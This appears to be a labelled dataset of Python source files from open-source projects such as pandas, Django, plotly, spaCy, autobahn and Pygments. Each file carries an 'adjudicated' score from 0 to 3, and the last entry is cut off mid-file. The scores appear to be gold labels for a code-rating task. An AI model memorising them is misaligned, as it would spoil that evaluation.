463	adjudicated	2	"from contextlib import contextmanager<<NEWL>>import os<<NEWL>>import tempfile<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from pandas.io.pytables import HDFStore<<NEWL>><<NEWL>>tables = pytest.importorskip(""tables"")<<NEWL>># set these parameters so we don't have file sharing<<NEWL>>tables.parameters.MAX_NUMEXPR_THREADS = 1<<NEWL>>tables.parameters.MAX_BLOSC_THREADS = 1<<NEWL>>tables.parameters.MAX_THREADS = 1<<NEWL>><<NEWL>><<NEWL>>def safe_remove(path):<<NEWL>>    if path is not None:<<NEWL>>        try:<<NEWL>>            os.remove(path)  # noqa: PDF008<<NEWL>>        except OSError:<<NEWL>>            pass<<NEWL>><<NEWL>><<NEWL>>def safe_close(store):<<NEWL>>    try:<<NEWL>>        if store is not None:<<NEWL>>            store.close()<<NEWL>>    except OSError:<<NEWL>>        pass<<NEWL>><<NEWL>><<NEWL>>def create_tempfile(path):<<NEWL>>    """"""create an unopened named temporary file""""""<<NEWL>>    return os.path.join(tempfile.gettempdir(), path)<<NEWL>><<NEWL>><<NEWL>># contextmanager to ensure the file cleanup<<NEWL>>@contextmanager<<NEWL>>def ensure_clean_store(path, mode=""a"", complevel=None, complib=None, fletcher32=False):<<NEWL>><<NEWL>>    try:<<NEWL>><<NEWL>>        # put in the temporary path if we don't have one already<<NEWL>>        if not len(os.path.dirname(path)):<<NEWL>>            path = create_tempfile(path)<<NEWL>><<NEWL>>        store = HDFStore(<<NEWL>>            path, mode=mode, complevel=complevel, complib=complib, fletcher32=False<<NEWL>>        )<<NEWL>>        yield store<<NEWL>>    finally:<<NEWL>>        safe_close(store)<<NEWL>>        if mode == ""w"" or mode == ""a"":<<NEWL>>            safe_remove(path)<<NEWL>><<NEWL>><<NEWL>>@contextmanager<<NEWL>>def ensure_clean_path(path):<<NEWL>>    """"""<<NEWL>>    return essentially a named temporary file that is not opened<<NEWL>>    and deleted on exiting; if path is a list, then create and<<NEWL>>    return list of filenames<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        if isinstance(path, list):<<NEWL>>            filenames = [create_tempfile(p) for p in path]<<NEWL>>            yield filenames<<NEWL>>        else:<<NEWL>>            filenames = [create_tempfile(path)]<<NEWL>>            yield filenames[0]<<NEWL>>    finally:<<NEWL>>        for f in filenames:<<NEWL>>            safe_remove(f)<<NEWL>><<NEWL>><<NEWL>>def _maybe_remove(store, key):<<NEWL>>    """"""<<NEWL>>    For tests using tables, try removing the table to be sure there is<<NEWL>>    no content from previous tests using the same table name.<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        store.remove(key)<<NEWL>>    except (ValueError, KeyError):<<NEWL>>        pass"
432	adjudicated	0	"from __future__ import absolute_import<<NEWL>><<NEWL>>from django import VERSION as django_version<<NEWL>>from django import forms<<NEWL>>from django.conf import settings<<NEWL>>from django.utils.encoding import force_text<<NEWL>>from django.utils.safestring import mark_safe<<NEWL>>from django.utils.html import format_html<<NEWL>><<NEWL>>from .utils import get_icon_choices<<NEWL>><<NEWL>>CHOICES = get_icon_choices()<<NEWL>><<NEWL>>class IconWidget(forms.Select):<<NEWL>><<NEWL>>    def __init__(self, attrs=None):<<NEWL>>        super(IconWidget, self).__init__(attrs, choices=CHOICES)<<NEWL>><<NEWL>>    if django_version >= (1, 11):<<NEWL>>        def create_option(self, name, value, label, selected, index, subindex=None, attrs=None):<<NEWL>>            option = super(IconWidget, self).create_option(name, value, label, selected, index, subindex=subindex, attrs=attrs)<<NEWL>>            option[""attrs""][""data-icon""] = value<<NEWL>>            return option<<NEWL>>    else:<<NEWL>>        def render_option(self, selected_choices, option_value, option_label):<<NEWL>>            if option_value is None:<<NEWL>>                option_value = ''<<NEWL>>            option_value = force_text(option_value)<<NEWL>>            if option_value in selected_choices:<<NEWL>>                selected_html = mark_safe(' selected=""selected""')<<NEWL>>                if not self.allow_multiple_selected:<<NEWL>>                    # Only allow for a single selection.<<NEWL>>                    selected_choices.remove(option_value)<<NEWL>>            else:<<NEWL>>                selected_html = ''<<NEWL>>            return format_html('<option data-icon=""{0}"" value=""{0}""{1}>{2}</option>',<<NEWL>>                option_value,<<NEWL>>                selected_html,<<NEWL>>                force_text(option_label),<<NEWL>>            )<<NEWL>><<NEWL>>    class Media:<<NEWL>><<NEWL>>        js = (<<NEWL>>            'fontawesome/js/django_fontawesome.js',<<NEWL>>            'fontawesome/select2/select2.min.js'<<NEWL>>        )<<NEWL>><<NEWL>>        css = {<<NEWL>>            'all': (<<NEWL>>                getattr(settings, 'FONTAWESOME_CSS_URL', 'fontawesome/css/font-awesome.min.css'),<<NEWL>>                'fontawesome/select2/select2.css',<<NEWL>>                'fontawesome/select2/select2-bootstrap.css'<<NEWL>>            )<<NEWL>>        }"
490	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""sankey.node.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
481	adjudicated	2	"""""""<<NEWL>>This module includes some utility functions for inspecting the layout<<NEWL>>of a GDAL data source -- the functionality is analogous to the output<<NEWL>>produced by the `ogrinfo` utility.<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib.gis.gdal import DataSource<<NEWL>>from django.contrib.gis.gdal.geometries import GEO_CLASSES<<NEWL>><<NEWL>><<NEWL>>def ogrinfo(data_source, num_features=10):<<NEWL>>    """"""<<NEWL>>    Walk the available layers in the supplied `data_source`, displaying<<NEWL>>    the fields for the first `num_features` features.<<NEWL>>    """"""<<NEWL>><<NEWL>>    # Checking the parameters.<<NEWL>>    if isinstance(data_source, str):<<NEWL>>        data_source = DataSource(data_source)<<NEWL>>    elif isinstance(data_source, DataSource):<<NEWL>>        pass<<NEWL>>    else:<<NEWL>>        raise Exception(<<NEWL>>            ""Data source parameter must be a string or a DataSource object.""<<NEWL>>        )<<NEWL>><<NEWL>>    for i, layer in enumerate(data_source):<<NEWL>>        print(""data source : %s"" % data_source.name)<<NEWL>>        print(""==== layer %s"" % i)<<NEWL>>        print(""  shape type: %s"" % GEO_CLASSES[layer.geom_type.num].__name__)<<NEWL>>        print(""  # features: %s"" % len(layer))<<NEWL>>        print(""         srs: %s"" % layer.srs)<<NEWL>>        extent_tup = layer.extent.tuple<<NEWL>>        print(""      extent: %s - %s"" % (extent_tup[0:2], extent_tup[2:4]))<<NEWL>>        print(""Displaying the first %s features ===="" % num_features)<<NEWL>><<NEWL>>        width = max(*map(len, layer.fields))<<NEWL>>        fmt = "" %%%ss: %%s"" % width<<NEWL>>        for j, feature in enumerate(layer[:num_features]):<<NEWL>>            print(""=== Feature %s"" % j)<<NEWL>>            for fld_name in layer.fields:<<NEWL>>                type_name = feature[fld_name].type_name<<NEWL>>                output = fmt % (fld_name, type_name)<<NEWL>>                val = feature.get(fld_name)<<NEWL>>                if val:<<NEWL>>                    if isinstance(val, str):<<NEWL>>                        val_fmt = ' (""%s"")'<<NEWL>>                    else:<<NEWL>>                        val_fmt = "" (%s)""<<NEWL>>                    output += val_fmt % val<<NEWL>>                else:<<NEWL>>                    output += "" (None)""<<NEWL>>                print(output)"
423	adjudicated	0	import os<<NEWL>>import asyncio<<NEWL>>import pytest<<NEWL>><<NEWL>>import txaio<<NEWL>><<NEWL>># because py.test tries to collect it as a test-case<<NEWL>>from unittest.mock import Mock<<NEWL>><<NEWL>>from autobahn.asyncio.websocket import WebSocketServerFactory<<NEWL>><<NEWL>><<NEWL>>async def echo_async(what, when):<<NEWL>>    await asyncio.sleep(when)<<NEWL>>    return what<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')<<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_echo_async():<<NEWL>>    assert 'Hello!' == await echo_async('Hello!', 0)<<NEWL>><<NEWL>><<NEWL>># @pytest.mark.asyncio(forbid_global_loop=True)<<NEWL>>@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')<<NEWL>>def test_websocket_custom_loop(event_loop):<<NEWL>>    factory = WebSocketServerFactory(loop=event_loop)<<NEWL>>    server = factory()<<NEWL>>    transport = Mock()<<NEWL>>    server.connection_made(transport)<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.skipif(not os.environ.get('USE_ASYNCIO', False), reason='test runs on asyncio only')<<NEWL>>@pytest.mark.asyncio<<NEWL>>async def test_async_on_connect_server(event_loop):<<NEWL>><<NEWL>>    num = 42<<NEWL>>    done = txaio.create_future()<<NEWL>>    values = []<<NEWL>><<NEWL>>    async def foo(x):<<NEWL>>        await asyncio.sleep(1)<<NEWL>>        return x * x<<NEWL>><<NEWL>>    async def on_connect(req):<<NEWL>>        v = await foo(num)<<NEWL>>        values.append(v)<<NEWL>>        txaio.resolve(done, req)<<NEWL>><<NEWL>>    factory = WebSocketServerFactory()<<NEWL>>    server = factory()<<NEWL>>    server.onConnect = on_connect<<NEWL>>    transport = Mock()<<NEWL>><<NEWL>>    server.connection_made(transport)<<NEWL>>    server.data = b'\r\n'.join([<<NEWL>>        b'GET /ws HTTP/1.1',<<NEWL>>        b'Host: www.example.com',<<NEWL>>        b'Sec-WebSocket-Version: 13',<<NEWL>>        b'Origin: http://www.example.com.malicious.com',<<NEWL>>        b'Sec-WebSocket-Extensions: permessage-deflate',<<NEWL>>        b'Sec-WebSocket-Key: tXAxWFUqnhi86Ajj7dRY5g==',<<NEWL>>        b'Connection: keep-alive, Upgrade',<<NEWL>>        b'Upgrade: websocket',<<NEWL>>        b'\r\n',  # last string doesn't get a \r\n from join()<<NEWL>>    ])<<NEWL>>    server.processHandshake()<<NEWL>>    await done<<NEWL>><<NEWL>>    assert len(values) == 1<<NEWL>>    assert values[0] == num * num
472	adjudicated	2	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class SpatialiteGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    spatial_index_enabled = models.IntegerField()<<NEWL>>    type = models.IntegerField(db_column=""geometry_type"")<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""geometry_columns""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s.%s - %dD %s field (SRID: %d)"" % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return ""f_table_name""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return ""f_geometry_column""<<NEWL>><<NEWL>><<NEWL>>class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    ref_sys_name = models.CharField(max_length=256)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""spatial_ref_sys""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
506	adjudicated	3	"""""""<<NEWL>>    pygments.styles.trac<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Port of the default trac highlighter design.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace<<NEWL>><<NEWL>><<NEWL>>class TracStyle(Style):<<NEWL>>    """"""<<NEWL>>    Port of the default trac highlighter design.<<NEWL>>    """"""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Whitespace:             '#bbbbbb',<<NEWL>>        Comment:                'italic #999988',<<NEWL>>        Comment.Preproc:        'bold noitalic #999999',<<NEWL>>        Comment.Special:        'bold #999999',<<NEWL>><<NEWL>>        Operator:               'bold',<<NEWL>><<NEWL>>        String:                 '#bb8844',<<NEWL>>        String.Regex:           '#808000',<<NEWL>><<NEWL>>        Number:                 '#009999',<<NEWL>><<NEWL>>        Keyword:                'bold',<<NEWL>>        Keyword.Type:           '#445588',<<NEWL>><<NEWL>>        Name.Builtin:           '#999999',<<NEWL>>        Name.Function:          'bold #990000',<<NEWL>>        Name.Class:             'bold #445588',<<NEWL>>        Name.Exception:         'bold #990000',<<NEWL>>        Name.Namespace:         '#555555',<<NEWL>>        Name.Variable:          '#008080',<<NEWL>>        Name.Constant:          '#008080',<<NEWL>>        Name.Tag:               '#000080',<<NEWL>>        Name.Attribute:         '#008080',<<NEWL>>        Name.Entity:            '#800080',<<NEWL>><<NEWL>>        Generic.Heading:        '#999999',<<NEWL>>        Generic.Subheading:     '#aaaaaa',<<NEWL>>        Generic.Deleted:        'bg:#ffdddd #000000',<<NEWL>>        Generic.Inserted:       'bg:#ddffdd #000000',<<NEWL>>        Generic.Error:          '#aa0000',<<NEWL>>        Generic.Emph:           'italic',<<NEWL>>        Generic.Strong:         'bold',<<NEWL>>        Generic.Prompt:         '#555555',<<NEWL>>        Generic.Output:         '#888888',<<NEWL>>        Generic.Traceback:      '#aa0000',<<NEWL>><<NEWL>>        Error:                  'bg:#e3d2d2 #a61717'<<NEWL>>    }"
446	adjudicated	1	"#!/usr/bin/env python3<<NEWL>><<NEWL>>import re<<NEWL>><<NEWL>>from homeassistant.components.binary_sensor import BinarySensorDeviceClass<<NEWL>>from homeassistant.components.button import ButtonDeviceClass<<NEWL>>from homeassistant.components.cover import CoverDeviceClass<<NEWL>>from homeassistant.components.number import NumberDeviceClass<<NEWL>>from homeassistant.components.sensor import SensorDeviceClass<<NEWL>>from homeassistant.components.switch import SwitchDeviceClass<<NEWL>><<NEWL>>BLOCKLIST = (<<NEWL>>    # requires special support on HA side<<NEWL>>    ""enum"",<<NEWL>>)<<NEWL>><<NEWL>>DOMAINS = {<<NEWL>>    ""binary_sensor"": BinarySensorDeviceClass,<<NEWL>>    ""button"": ButtonDeviceClass,<<NEWL>>    ""cover"": CoverDeviceClass,<<NEWL>>    ""number"": NumberDeviceClass,<<NEWL>>    ""sensor"": SensorDeviceClass,<<NEWL>>    ""switch"": SwitchDeviceClass,<<NEWL>>}<<NEWL>><<NEWL>><<NEWL>>def sub(path, pattern, repl):<<NEWL>>    with open(path, ""r"") as handle:<<NEWL>>        content = handle.read()<<NEWL>>    content = re.sub(pattern, repl, content, flags=re.MULTILINE, count=1)<<NEWL>>    with open(path, ""w"") as handle:<<NEWL>>        handle.write(content)<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    classes = {""EMPTY"": """"}<<NEWL>>    allowed = {}<<NEWL>><<NEWL>>    for domain, enum in DOMAINS.items():<<NEWL>>        available = {<<NEWL>>            cls.value.upper(): cls.value for cls in enum if cls.value not in BLOCKLIST<<NEWL>>        }<<NEWL>><<NEWL>>        classes.update(available)<<NEWL>>        allowed[domain] = list(available.keys()) + [""EMPTY""]<<NEWL>><<NEWL>>    # replace constant defines in const.py<<NEWL>>    out = """"<<NEWL>>    for cls in sorted(classes):<<NEWL>>        out += f'DEVICE_CLASS_{cls.upper()} = ""{classes[cls]}""\n'<<NEWL>>    sub(""esphome/const.py"", '(DEVICE_CLASS_\w+ = ""\w*""\r?\n)+', out)<<NEWL>><<NEWL>>    for domain in sorted(allowed):<<NEWL>>        # replace imports<<NEWL>>        out = """"<<NEWL>>        for item in sorted(allowed[domain]):<<NEWL>>            out += f""    DEVICE_CLASS_{item.upper()},\n""<<NEWL>><<NEWL>>        sub(<<NEWL>>            f""esphome/components/{domain}/__init__.py"",<<NEWL>>            ""(    DEVICE_CLASS_\w+,\r?\n)+"",<<NEWL>>            out,<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    main()"
417	adjudicated	0	"import pytest<<NEWL>>from spacy.lang.en import English<<NEWL>>from spacy.training import Example<<NEWL>>from thinc.api import Config<<NEWL>><<NEWL>>default_tok2vec_config = """"""<<NEWL>>[model]<<NEWL>>@architectures = ""spacy-legacy.HashEmbedCNN.v1""<<NEWL>>pretrained_vectors = null<<NEWL>>width = 96<<NEWL>>depth = 4<<NEWL>>embed_size = 2000<<NEWL>>window_size = 1<<NEWL>>maxout_pieces = 3<<NEWL>>subword_features = true<<NEWL>>""""""<<NEWL>>DEFAULT_TOK2VEC_MODEL = Config().from_str(default_tok2vec_config)[""model""]<<NEWL>><<NEWL>>TRAIN_DATA = [<<NEWL>>    (<<NEWL>>        ""They trade mortgage-backed securities."",<<NEWL>>        {<<NEWL>>            ""heads"": [1, 1, 4, 4, 5, 1, 1],<<NEWL>>            ""deps"": [""nsubj"", ""ROOT"", ""compound"", ""punct"", ""nmod"", ""dobj"", ""punct""],<<NEWL>>        },<<NEWL>>    ),<<NEWL>>    (<<NEWL>>        ""I like London and Berlin."",<<NEWL>>        {<<NEWL>>            ""heads"": [1, 1, 1, 2, 2, 1],<<NEWL>>            ""deps"": [""nsubj"", ""ROOT"", ""dobj"", ""cc"", ""conj"", ""punct""],<<NEWL>>        },<<NEWL>>    ),<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.parametrize(<<NEWL>>    ""parser_config"",<<NEWL>>    [<<NEWL>>        {<<NEWL>>            ""@architectures"": ""spacy-legacy.TransitionBasedParser.v1"",<<NEWL>>            ""state_type"": ""parser"",<<NEWL>>            ""extra_state_tokens"": False,<<NEWL>>            ""hidden_width"": 66,<<NEWL>>            ""maxout_pieces"": 2,<<NEWL>>            ""use_upper"": True,<<NEWL>>            ""tok2vec"": DEFAULT_TOK2VEC_MODEL,<<NEWL>>        }<<NEWL>>    ],<<NEWL>>)<<NEWL>>def test_parser(parser_config):<<NEWL>>    pipe_config = {""model"": parser_config}<<NEWL>>    nlp = English()<<NEWL>>    parser = nlp.add_pipe(""parser"", config=pipe_config)<<NEWL>>    train_examples = []<<NEWL>>    for text, annotations in TRAIN_DATA:<<NEWL>>        train_examples.append(Example.from_dict(nlp.make_doc(text), annotations))<<NEWL>>        for dep in annotations.get(""deps"", []):<<NEWL>>            if dep is not None:<<NEWL>>                parser.add_label(dep)<<NEWL>>    optimizer = nlp.initialize(get_examples=lambda: train_examples)<<NEWL>>    for i in range(150):<<NEWL>>        losses = {}<<NEWL>>        nlp.update(train_examples, sgd=optimizer, losses=losses)<<NEWL>>    assert losses[""parser""] < 0.0001"
188	adjudicated	2	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class SpatialiteGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    spatial_index_enabled = models.IntegerField()<<NEWL>>    type = models.IntegerField(db_column=""geometry_type"")<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""geometry_columns""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s.%s - %dD %s field (SRID: %d)"" % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return ""f_table_name""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return ""f_geometry_column""<<NEWL>><<NEWL>><<NEWL>>class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>><<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    ref_sys_name = models.CharField(max_length=256)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = ""gis""<<NEWL>>        db_table = ""spatial_ref_sys""<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
219	adjudicated	2	"from django.conf import settings<<NEWL>>from django.utils.translation import get_supported_language_variant<<NEWL>>from django.utils.translation.trans_real import language_code_re<<NEWL>><<NEWL>>from . import Error, Tags, register<<NEWL>><<NEWL>>E001 = Error(<<NEWL>>    ""You have provided an invalid value for the LANGUAGE_CODE setting: {!r}."",<<NEWL>>    id=""translation.E001"",<<NEWL>>)<<NEWL>><<NEWL>>E002 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES setting: {!r}."",<<NEWL>>    id=""translation.E002"",<<NEWL>>)<<NEWL>><<NEWL>>E003 = Error(<<NEWL>>    ""You have provided an invalid language code in the LANGUAGES_BIDI setting: {!r}."",<<NEWL>>    id=""translation.E003"",<<NEWL>>)<<NEWL>><<NEWL>>E004 = Error(<<NEWL>>    ""You have provided a value for the LANGUAGE_CODE setting that is not in ""<<NEWL>>    ""the LANGUAGES setting."",<<NEWL>>    id=""translation.E004"",<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_language_code(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGE_CODE setting is invalid.""""""<<NEWL>>    tag = settings.LANGUAGE_CODE<<NEWL>>    if not isinstance(tag, str) or not language_code_re.match(tag):<<NEWL>>        return [Error(E001.msg.format(tag), id=E001.id)]<<NEWL>>    return []<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E002.msg.format(tag), id=E002.id)<<NEWL>>        for tag, _ in settings.LANGUAGES<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_setting_languages_bidi(app_configs, **kwargs):<<NEWL>>    """"""Error if LANGUAGES_BIDI setting is invalid.""""""<<NEWL>>    return [<<NEWL>>        Error(E003.msg.format(tag), id=E003.id)<<NEWL>>        for tag in settings.LANGUAGES_BIDI<<NEWL>>        if not isinstance(tag, str) or not language_code_re.match(tag)<<NEWL>>    ]<<NEWL>><<NEWL>><<NEWL>>@register(Tags.translation)<<NEWL>>def check_language_settings_consistent(app_configs, **kwargs):<<NEWL>>    """"""Error if language settings are not consistent with each other.""""""<<NEWL>>    try:<<NEWL>>        get_supported_language_variant(settings.LANGUAGE_CODE)<<NEWL>>    except LookupError:<<NEWL>>        return [E004]<<NEWL>>    else:<<NEWL>>        return []"
359	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCKRDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import CP949_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class CP949Prober(MultiByteCharSetProber):<<NEWL>>    def __init__(self):<<NEWL>>        super(CP949Prober, self).__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)<<NEWL>>        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be<<NEWL>>        #       not different.<<NEWL>>        self.distribution_analyzer = EUCKRDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self):<<NEWL>>        return ""CP949""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self):<<NEWL>>        return ""Korean"""
248	adjudicated	1	"# coding: utf8<<NEWL>>from __future__ import unicode_literals<<NEWL>>import numpy<<NEWL>><<NEWL>>from ... import describe<<NEWL>>from .model import Model<<NEWL>>from ...describe import Dimension, Synapses, Biases, Gradient<<NEWL>><<NEWL>><<NEWL>>def _set_dimensions_if_needed(model, X, y=None):<<NEWL>>    if model.nI is None:<<NEWL>>        model.nI = X.shape[1]<<NEWL>>    if model.nO is None and y is not None:<<NEWL>>        if len(y.shape) == 2:<<NEWL>>            model.nO = y.shape[1]<<NEWL>>        else:<<NEWL>>            model.nO = int(y.max()) + 1<<NEWL>><<NEWL>><<NEWL>>@describe.on_data(_set_dimensions_if_needed)<<NEWL>>@describe.attributes(<<NEWL>>    nB=Dimension(""Batch size""),<<NEWL>>    nI=Dimension(""Input size""),<<NEWL>>    nO=Dimension(""Output size""),<<NEWL>>    W=Synapses(<<NEWL>>        ""Weights matrix"",<<NEWL>>        lambda obj: (obj.nO, obj.nI),<<NEWL>>        lambda W, ops: ops.xavier_uniform_init(W),<<NEWL>>    ),<<NEWL>>    b=Biases(""Bias vector"", lambda obj: (obj.nO,)),<<NEWL>>    d_W=Gradient(""W""),<<NEWL>>    